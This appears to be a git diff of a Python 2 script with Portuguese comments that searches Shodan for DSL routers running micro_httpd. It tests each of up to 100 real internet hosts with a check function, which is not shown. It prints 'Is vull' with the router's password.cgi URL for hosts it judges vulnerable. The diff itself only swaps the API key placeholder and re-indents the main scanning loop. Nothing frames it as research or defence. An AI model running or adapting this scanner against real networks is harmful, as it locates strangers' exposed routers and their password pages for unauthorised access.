@@ -28,7 +28,7 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 #Api Key Shodan
-key = "suakey"
+key = "SUA KEY AQUI"
  
 os.system('clear')
 print '               _       _    '
@@ -65,22 +65,22 @@ def checar(ip):
 
 if __name__ == "__main__":
 	
-api = WebAPI(key)
-res = api.search('DSL Router micro_httpd')#Dork shodan dos modelos vulneraveis
-i = 1
-try:
-         while i <= 100: #Vai printar apenas 100 resultados pela API ser free
- 
-                 for ips in res['matches']:
- 
-                         print '[!] Testando http://%s' % ips['ip'] + bcolors.WARNING +' | Localizado em: ' + bcolors.ENDC + ips['country_name'] + bcolors.WARNING + ' | na porta:'+ bcolors.ENDC, bcolors.OKBLUE, ips['port'], bcolors.ENDC
- 
-                         if(checar(ips['ip'])):
-							 
-                                 print '[+] Is vull: http://%s/password.cgi' % ips['ip']
-                                               
-                 i +=1												
-except():
-         print 'Failed'
+	api = WebAPI(key)
+	res = api.search('DSL Router micro_httpd')#Dork shodan dos modelos vulneraveis
+	i = 1
+	try:
+	         while i <= 100: #Vai printar apenas 100 resultados pela API ser free
+	 
+	                 for ips in res['matches']:
+	 
+	                         print '[!] Testando http://%s' % ips['ip'] + bcolors.WARNING +' | Localizado em: ' + bcolors.ENDC + ips['country_name'] + bcolors.WARNING + ' | na porta:'+ bcolors.ENDC, bcolors.OKBLUE, ips['port'], bcolors.ENDC
+	 
+	                         if(checar(ips['ip'])):
+								 
+	                                 print '[+] Is vull: http://%s/password.cgi' % ips['ip']
+	                                               
+	                 i +=1												
+	except():
+	         print 'Failed'
  
  
